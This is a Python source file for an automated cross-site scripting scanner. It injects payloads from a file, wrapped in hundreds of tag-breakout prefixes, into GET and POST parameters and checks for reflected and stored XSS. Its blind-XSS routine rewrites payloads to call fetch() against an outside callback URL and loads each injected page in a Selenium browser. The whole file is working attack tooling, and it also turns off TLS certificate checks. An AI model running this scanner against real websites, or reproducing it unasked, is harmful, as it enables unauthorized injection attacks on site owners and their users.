import requests
from urllib.parse import urlparse
from urllib3 import disable_warnings,exceptions
disable_warnings(exceptions.InsecureRequestWarning)
import json
import argparse

from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.webdriver import WebDriver
from time import sleep



proxy_url = 'http://127.0.0.1:8080'
proxies = {
    'http': proxy_url,
    'https': proxy_url,
}

class xss:
    def __init__(self, TargetUrl, headers=None, data=None, endpoint=None, PostXss=None,GetXss=None, payloadFile=None, isStored=None, blindUrl=None ):
        self.TargetUrl = TargetUrl
        self.hostName = self.getHostname(TargetUrl)
        self.headers = headers
        self.data = data
        self.endpoint = endpoint
        self.payloadFile = payloadFile
        self.payloads = self.ReadPayloads()
        self.PostXss = PostXss
        self.GetXss = GetXss
        self.isStored = isStored
        self.blindUrl = blindUrl

    def ReadPayloads(self):
        try:
            with open(self.payloadFile, 'r') as file:
                Lines = [line.strip() for line in file.readlines() if line.strip()]
                return Lines
        except:
            print("Error in reading file {}".format(self.payloadFile))
      
    def getHostname(self,url):
        parsedUrl = urlparse(url)
        return parsedUrl.hostname
    
    def sendPost(self):
        try:
            if self.headers and self.data and self.endpoint:
                response = requests.post(self.TargetUrl+self.endpoint, headers=self.headers, data=self.data ,proxies=proxies,verify=False)
                return response
            else:
                return False
        except:
            print("error in sending post")
            return False
    
    def checkXssPost(self, escapeElement=None):
        if self.headers and self.endpoint and self.data and self.PostXss :
            for i in self.payloads:
                if escapeElement:
                        escapedPayloads = self.escapElementPayload(i)
                else:
                        escapedPayloads = self.escapePayload(i)

                for p in escapedPayloads:
                    self.data[self.PostXss] = p
                    response = self.sendPost()
                    if self.checkResponseResult(response, i):
                        print("xss Found",i,"   ",self.TargetUrl)
        else:
            print("all parameter must be passed")

   
    def checkXssGet(self, escapeElement=None):
        try:
            if self.GetXss in self.TargetUrl:
                for i in self.payloads:
                    if escapeElement:
                        escapedPayloads = self.escapElementPayload(i)
                    else:
                        escapedPayloads = self.escapePayload(i)
                    for p in escapedPayloads:
                        TargetUrl = self.TargetUrl.replace(self.GetXss, p)
                        response = requests.get(TargetUrl)
                        if self.checkResponseResult(response, i):
                            print("Xss found in ",p,f"  {TargetUrl}")
                            #return True
        except:
            print("error in sending get")
            return False

    def checkResponseStatusCode(self, response):
        try:
            if response.status_code == 200:
                return True
            else:
                return False
        except:
            print("response doesn't have status_code")
    
    def checkResponseResult(self, response, i ):
        try:
            if response.status_code == 200 and i in response.text:
                return True
            else:
                return False
        except:
            print("response doesn't have test")
    
    def escapePayload(self, payload):
        escape = ['','">',"'>",'-->','</script>',"'/>"]
        return [i+payload for i in escape]

    def escapElementPayload(self, payload):
        escape = ['','">', "'>", '-->', '</script>', '</a>', '</a2>', '</area>', '</article>', '</aside>', '</b>', '</blockquote>', '</body>', '</br>', '</button>', '</canvas>', '</caption>', '</code>', '</col>', '</data>', '</datalist>', '</dd>', '</div>', '</dl>', '</dt>', '</embed>', '</figure>', '</font>', '</footer>', '</form>', '</frame>', '</frameset>', '</h1>', '</head>', '</header>', '</hgroup>', '</hr>', '</html>', '</i>', '</iframe>', '</iframe2>', '</image>', '</image2>', '</image3>', '</img>', '</img2>', '</input>', '</input2>', '</input3>', '</input4>', '</label>', '</li>', '</link>', '</listing>', '</map>', '</mark>', '</marquee>', '</menu>', '</menuitem>', '</meta>', '</meter>', '</multicol>', '</nav>', '</nextid>', '</noembed>', '</noframes>', '</noscript>', '</object>', '</ol>', '</optgroup>', '</option>', '</output>', '</p>', '</param>', '</picture>', '</plaintext>', '</pre>', '</progress>', '</q>', '</rb>', '</rp>', '</rt>', '</rtc>', '</ruby>', '</s>', '</samp>', '</script>', '</section>', '</select>', '</set>', '</small>', '</source>', '</spacer>', '</span>', '</strike>', '</strong>', '</style>', '</sub>', '</summary>', '</sup>', '</svg>', '</table>', '</tbody>', '</td>', '</template>', '</textarea>', '</tfoot>', '</th>', '</thead>', '</time>', '</title>', '</tr>', '</track>', '</tt>', '</u>', '</ul>', '</var>', '</video>', '</video2>', '"></a>', '"></a2>', '"></area>', '"></article>', '"></aside>', '"></b>', '"></blockquote>', '"></body>', '"></br>', '"></button>', '"></canvas>', '"></caption>', '"></code>', '"></col>', '"></data>', '"></datalist>', '"></dd>', '"></div>', '"></dl>', '"></dt>', '"></embed>', '"></figure>', '"></font>', '"></footer>', '"></form>', '"></frame>', '"></frameset>', '"></h1>', '"></head>', '"></header>', '"></hgroup>', '"></hr>', '"></html>', '"></i>', '"></iframe>', '"></iframe2>', '"></image>', '"></image2>', '"></image3>', '"></img>', '"></img2>', '"></input>', '"></input2>', '"></input3>', '"></input4>', '"></label>', '"></li>', '"></link>', '"></listing>', '"></map>', '"></mark>', '"></marquee>', '"></menu>', '"></menuitem>', '"></meta>', '"></meter>', '"></multicol>', '"></nav>', '"></nextid>', '"></noembed>', '"></noframes>', '"></noscript>', '"></object>', '"></ol>', '"></optgroup>', '"></option>', '"></output>', '"></p>', '"></param>', '"></picture>', '"></plaintext>', '"></pre>', '"></progress>', '"></q>', '"></rb>', '"></rp>', '"></rt>', '"></rtc>', '"></ruby>', '"></s>', '"></samp>', '"></script>', '"></section>', '"></select>', '"></set>', '"></small>', '"></source>', '"></spacer>', '"></span>', '"></strike>', '"></strong>', '"></style>', '"></sub>', '"></summary>', '"></sup>', '"></svg>', '"></table>', '"></tbody>', '"></td>', '"></template>', '"></textarea>', '"></tfoot>', '"></th>', '"></thead>', '"></time>', '"></title>', '"></tr>', '"></track>', '"></tt>', '"></u>', '"></ul>', '"></var>', '"></video>', '"></video2>']
        return [i+payload for i in escape]

    def checkStoredXss(self, payload):
        if self.isStored:
            response = requests.get(self.isStored)
            if self.checkResponseResult(response, payload):
                return True
            else:
                return False
        else:
            print("no path to check if sotred")

    def storedXssGet(self, escapeElement=None):
        if self.isStored :
            try:
                if self.GetXss in self.TargetUrl:
                    for i in self.payloads:
                        if escapeElement:
                            escapedPayloads = self.escapElementPayload(i)
                        else:
                            escapedPayloads = self.escapePayload(i)
                        for p in escapedPayloads:
                            TargetUrl = self.TargetUrl.replace(self.GetXss, p)
                            response = requests.get(TargetUrl)
                            if self.checkStoredXss(i):
                                print("Xss found in ",p,f"  {TargetUrl}")
                                #return True
            except:
                print("error in sending get")
                return False
                

    def storedXssPost(self, escapeElement=None):
        if self.headers and self.endpoint and self.data and self.PostXss :
            for i in self.payloads:
                if escapeElement:
                    escapedPayloads = self.escapElementPayload(i)
                else:
                    escapedPayloads = self.escapePayload(i)

                for p in escapedPayloads:
                    self.data[self.PostXss] = p
                    response = self.sendPost()
                    if self.checkStoredXss(i):
                        print("xss Found",i,"   ",self.TargetUrl)
                        #return True
        else:
            print("all parameter must be passed")


    def CreatWebDriver(self, HeadLess=None):
        webdriverPath = '/home/mr124/Documents/geckodriver'
        options = Options()
        options.set_preference("javascript.enabled", True)
        if HeadLess:
            options.add_argument("-headless") 
            print("headless")
        return WebDriver(service=Service(webdriverPath), options=options)
        
    def xssBlind(self, escapeElement=None ):
        driver = self.CreatWebDriver(HeadLess=None)
        for i in self.payloads:
            i = i.replace('alert(1)', f'fetch("{self.blindUrl}")')
            if escapeElement:
                escapedPayloads = self.escapElementPayload(i)
            else:
                escapedPayloads = self.escapePayload(i)
            for p in escapedPayloads:
                TargetUrl = self.TargetUrl.replace(self.GetXss, p)
                try:
                    print(TargetUrl)
                    driver.get(TargetUrl)
                    sleep(2)
                except:
                    print("error in getting driver url")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Xss script", add_help=False)
    parser.add_argument('--help', '-h', action='help', help='this is a help message')
    parser.add_argument('--url', type=str, help='Input dictionary headers like {"key":"value"}')
    parser.add_argument('--headers', type=str, help='Input dictionary headers like {"key":"value"}')
    parser.add_argument('--postData', type=str, help='Input dictionary PostData like {"key":"value"}')
    parser.add_argument('--endpoint', type=str, help='Input str')
    parser.add_argument('--GetXss', type=str, help='Input which will be the payload')
    parser.add_argument('--PostXss', type=str, help='Input which will be the payload in the post')
    parser.add_argument('--payloadFile', type=str, help='Input file contains the paylaods')
    parser.add_argument('--isStored', type=str, help='where to check if the payload is stored in the website')
    parser.add_argument('--blindUrl', type=str, help='where to check if the payload is stored in the website')








    args = parser.parse_args()
    url = args.url
    headers = json.loads(args.headers) if args.headers else None
    PostData = json.loads(args.postData) if args.postData else None
    EndPoint = args.endpoint
    GetXss = args.GetXss
    PostXss = args.PostXss
    payloadFile = args.payloadFile
    isStored = args.isStored
    blindUrl = args.blindUrl


    Test = xss(TargetUrl=url,headers=headers,data=PostData,endpoint=EndPoint,GetXss=GetXss,PostXss=PostXss, payloadFile=payloadFile, isStored=isStored, blindUrl=blindUrl)
    Test.xssBlind()

